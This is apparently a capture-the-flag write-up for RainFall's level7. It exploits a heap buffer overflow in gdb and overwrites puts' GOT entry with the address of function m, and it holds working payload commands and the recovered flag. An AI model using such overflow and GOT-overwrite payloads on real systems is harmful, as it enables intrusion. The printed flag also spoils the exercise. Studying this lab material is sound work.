Looking at file source, the password is stored in a global variable at the end of main

we will try to overwrite call to function `puts` to call to function `m` to read the global cvariable c

### Lets find the addresse of `puts` and address of `m`

```console
(gdb) x &puts
0xb7e927e0 <puts>:	0x893cec83
```

```console
(gdb) x &m
0x80484f4 <m>:	0x83e58955
```

<!-- 0x8048400 puts plt ???? -->

<!-- Adress of puts plt = `0x8048400` == `\x00\x84\x04\x08` -->

Address of puts = `0xb7e927e0` == `\xe0\x27\xe9\xb7`

Address of m = `0x080484f4` == `\xf4\x84\x04\x08`

### How to overwrite address of puts ?

Through a heap buffer overflow !

```console
(gdb) x/50x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000
```

With `argv[1]` we will write in `str1`. we will overflow to write the return address of `main` on address of `str2`

`"A" * 20 + "\xe0\x27\xe9\xb7"`

The second strcpy will write argv[2] on the return address of `main`. This way we can write the address of `m` instead

Lets try to write m at the return address of main

```
(gdb) print $esp
$2 = (void *) 0xbffff710
```

<!-- `0xbffff710` - 3c (60) = `BFFFF6D4` == `\xd4\xf6\xff\xbf` -->

`0xbffff710` == `\x10\xf7\xff\xbf`

### Payload

```
./level7 `(python -c 'print ("A" * 20 + "\return address main")')` `(python -c 'print ("\xf4\x84\x04\x08" * 16)')`
```

try1 with `0xbffff710`

```
./level7 `(python -c 'print ("A" * 20 + "\x10\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 16)')`
```

`* 152` = valide
`* 153` = segfault

---

try 2 with `0xbffff70f` (0xbffff710 - 1 ) == `\x0f\xf7\xff\xbf`

```
./level7 `(python -c 'print ("A" * 20 + "\x0f\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 1)')`
```

`* 1` = segfault

---

try 2 with `0xbffff70e` (0xbffff710 - 2 ) == `\x0f\xf7\xff\xbf`

```
./level7 `(python -c 'print ("A" * 20 + "\x0f\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 2)')`
```

<!-- ```
./level7 `(python -c 'print ("A" * 20 + "\xe0\x27\xe9\xb7")')` `(python -c 'print ("\xf4\x84\x04\x08")')`
```

./level7 `(python -c 'print ("A" * 20 + "\x00\x84\x04\x08")')` `(python -c 'print ("\xf4\x84\x04\x08")')` -->

Address of puts in the GOT

```
level7@RainFall:~$ objdump -R level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```
`08049928` == `\x28\x99\x04\x08`

```
./level7 `(python -c 'print ("A" * 20 + "\x28\x99\x04\x08")')` `(python -c 'print ("\xf4\x84\x04\x08")')`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
